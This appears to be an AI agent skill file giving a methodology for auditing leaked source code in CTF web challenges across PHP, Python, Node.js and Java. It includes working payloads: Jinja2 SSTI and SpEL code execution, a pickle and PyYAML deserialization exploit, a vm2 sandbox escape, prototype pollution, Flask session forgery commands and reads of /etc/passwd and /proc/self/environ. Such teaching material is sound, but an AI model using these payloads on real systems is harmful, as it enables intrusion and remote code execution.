---
name: ctf-source-audit
description: "Source code audit methodology for CTF challenges. Use when source code is leaked through .git directories, .bak/.zip backups, or /proc/self/environ. Unlike a real code audit — vulnerabilities in CTF source code are deliberately planted and there are usually only 1-2 key points. First find the dangerous functions (sinks), then trace the path of the input (source) to those functions. Covers dangerous functions and vulnerability patterns for PHP/Python/Node.js/Java"
zh-signals: "CTF 挑战中的源码审计方法，从危险函数反向追溯输入路径。信号:CTF,源码审计,危险函数,代码审计,PHP"
when-to-use: "Use when CTF source code is leaked via .git, backup files, or /proc/self/environ and you need to audit intentionally planted vulnerabilities."
metadata:
  tags: "ctf,source,audit,code review,source-code-audit,php,python,node,java,code-audit,SAST"
  category: "ctf"
---

# CTF Source Code Audit Methodology

CTF source code audit ≠ a real code audit. The differences:
- A real audit: tens of thousands of lines, the vulnerability can be anywhere
- A CTF audit: **dozens to hundreds of lines, the vulnerability is deliberately planted and usually obvious**

Core strategy: **find the dangerous functions** (sinks), then trace the path of the input (source) to those dangerous functions.

## ⛔ Further Reading (Must Read)

- Complete dangerous function list and vulnerability patterns for PHP/Python/Node.js/Java → [references/dangerous-functions.md](references/dangerous-functions.md)

## Phase 1: Quickly Identify the Language and Framework

| Indicator | Language/Framework |
|------|-----------|
| `.php` files, `<?php` | PHP |
| `app.py`, `from flask`, `import django` | Python (Flask/Django) |
| `package.json`, `require()`, `app.js` | Node.js (Express) |
| `pom.xml`, `.java`, `@Controller` | Java (Spring) |
| `go.mod`, `func main()` | Go |

## Phase 2: Audit Workflow

### 2.1 Quickly Locate Dangerous Functions

| Language | Command Execution | Deserialization | Template Injection | File Operations |
|------|----------|----------|----------|----------|
| PHP | `system()` `eval()` `exec()` `passthru()` | `unserialize()` | N/A | `include()` `file_get_contents()` |
| Python | `os.system()` `eval()` `exec()` `subprocess` | `pickle.loads()` `yaml.load()` | `render_template_string()` | `open()` |
| Node.js | `child_process.exec()` `eval()` | N/A | EJS/Pug inject | `fs.readFile()` |
| Java | `Runtime.exec()` `ProcessBuilder` | `ObjectInputStream` | SpEL/FreeMarker | `FileInputStream` |

→ Complete dangerous function list → [references/dangerous-functions.md](references/dangerous-functions.md)

### 2.2 Trace the Data Flow (sink → source)

1. **Where does the parameter come from?** — `$_GET`, `request.args`, `req.body`, `@RequestParam`
2. **Is there any filtering?** — search for `filter`, `sanitize`, `escape`, `replace`, `blacklist`
3. **Can the filtering be bypassed?** — CTF challenges usually have a bypass (blacklist omission, double encoding, case sensitivity, array bypass)

### 2.3 Audit Deliverables
1. Vulnerability type and location (file name + line number)
2. Exploitation method (what request to construct to trigger it)
3. Path to obtain the flag

## Phase 3: Common PHP Vulnerability Patterns

### Weak Comparison (`==` vs `===`)

```php
// Strings starting with 0e are treated as scientific notation in == comparisons and equal 0
if ($_GET['password'] == '0e123456') { ... }  // input "0" → true
if (md5($a) == md5($b)) { ... }  // find two md5 values starting with 0e

// 0e MD5 collision values:
// md5("240610708")  = 0e462097431906509019562988736854
// md5("QNKCDZO")    = 0e830400451993494058024219903391
// md5("s878926199a") = 0e545993274517709034328855841020

// Array bypass of ===
if ($a != $b && md5($a) === md5($b)) { ... }
// md5(array) returns NULL → a[]=1&b[]=2
```

### Variable Overwrite

```php
extract($_GET);  // GET parameters overwrite arbitrary variables
parse_str($str); // parses a string into variables (when no second argument is given)
$$key = $value;  // variable variables

// Exploitation: ?admin=1 overwrites the $admin variable
```

### PHP Type Juggling

```php
// intval() truncation
intval("123abc") === 123  // the non-numeric part is ignored
intval("0x1A") === 0      // PHP 7 does not parse hex (PHP 5 does)

// is_numeric() bypass
is_numeric("0x539") → true (PHP 5)
is_numeric("1e5") → true   // scientific notation

// in_array() loose comparison
in_array(0, ['a','b','c']) → true  // 0 == 'a' is true in a loose comparison (PHP < 7)
// Fix: in_array(0, ['a','b','c'], true) third parameter = strict
```

### preg_replace /e (PHP < 7.0)

```php
preg_replace('/.*/e', 'system("id")', '');  // the /e modifier executes the replacement result
```

### Deserialization POP Chain

Search for the `__wakeup()`, `__destruct()`, `__toString()` magic methods and construct a chained call.

```php
// __wakeup bypass: the serialized string claims more properties than actually exist
O:4:"User":3:{...}  // only 2 properties exist but 3 are written → skips __wakeup
// Applies to PHP 5.x - 7.0.10
```

## Phase 4: Common Python Vulnerability Patterns

### Flask Session Forgery

```python
# If you know the SECRET_KEY, you can forge a Flask session
# Tool: flask-unsign
flask-unsign --decode --cookie 'SESSION_COOKIE'
flask-unsign --sign --cookie "{'user':'admin'}" --secret 'SECRET_KEY'

# SECRET_KEY leak paths:
# - hardcoded in the source code
# - environment variable in /proc/self/environ
# - config.py / .env file
```

### Werkzeug Debug PIN Calculation

```python
# When Flask DEBUG=True, /console requires a PIN
# PIN calculation factors (all obtainable via LFI):
# 1. username: the user running Flask in /etc/passwd
# 2. modname: usually "flask.app"
# 3. appname: usually "Flask"
# 4. modpath: the path of flask/app.py → /proc/self/cmdline + find
# 5. MAC address: /sys/class/net/eth0/address → convert to decimal
# 6. machine-id: /etc/machine-id + /proc/self/cgroup (Docker)

# See server-side-advanced.md in ctf-web-methodology for the calculation script
```

### SSTI (Jinja2)

```python
render_template_string(user_input)  # dangerous!
# Detection: {{7*7}} → 49
# RCE: {{lipsum.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Pickle Deserialization RCE

```python
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('cat /flag.txt',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
```

### Unsafe PyYAML Loading

```python
yaml.load(data)  # unsafe! yaml.safe_load() is required
# payload: !!python/object/apply:os.system ['cat /flag.txt']
```

## Phase 5: Common Node.js Vulnerability Patterns

### Prototype Pollution

```javascript
// Dangerous functions: Object.assign(), _.merge(), _.set(), recursive merge
// payload: {"__proto__":{"isAdmin":true}}
// Or: {"constructor":{"prototype":{"isAdmin":true}}}

// Exploitation scenarios:
// 1. Modifying Object.prototype affects everything globally
// 2. Overwriting existing properties (role: admin)
// 3. RCE: polluting the env/shell of child_process
```

### require() Path Traversal

```javascript
// If the user controls the require() argument
require('../../../etc/passwd');  // does not execute but can leak error messages
require('/proc/self/environ');
```

### eval() / vm Escape

```javascript
// vm2 sandbox escape (multiple CVEs)
const {VM} = require("vm2");
const vm = new VM();
vm.run('this.constructor.constructor("return process")().mainModule.require("child_process").execSync("id").toString()');
```

## Phase 6: Common Java Vulnerability Patterns

### SpEL Injection (Spring)

```java
// If user input is embedded into a SpEL expression
// Detection: ${7*7} → 49 or #{7*7} → 49
// RCE:
#{T(java.lang.Runtime).getRuntime().exec("id")}
```

### XXE (Java XML Parsing)

Java XML parsers do not disable external entities by default (it must be set manually), making them a common XXE ground.

### Deserialization (ObjectInputStream)

Search for `ObjectInputStream.readObject()` → use ysoserial to generate the payload.

## Notes

- CTF source is usually short (<200 lines), do not use complex tools, manual auditing is enough
- Prioritize searching for the `flag`, `secret`, `admin` keywords
- Watch for hints in comments (CTF authors sometimes leave clues)
- Multi-file projects: look at the routes first (`app.py` / `index.php` / `app.js`), then the controller logic
